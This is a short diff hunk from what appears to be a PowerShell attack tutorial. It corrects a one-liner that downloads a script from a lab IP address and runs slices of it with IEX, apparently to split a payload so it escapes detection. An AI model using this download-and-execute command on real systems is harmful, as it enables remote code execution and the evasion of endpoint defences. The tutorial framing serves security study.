@@ -260,7 +260,7 @@ We will be running those substrings using IEX.
 Let's combine everything and run the "1 liner":
 
 ```
-$full =3D (New-Object Net.Webclient).downloadstring("
+$full =(New-Object Net.Webclient).downloadstring("
 http://192.168.159.131/rastamouse/full.txt"); IEX($full.substring(0,591));
 IEX($full.substring(591,60)); IEX($full.substring(651,126))
 ```
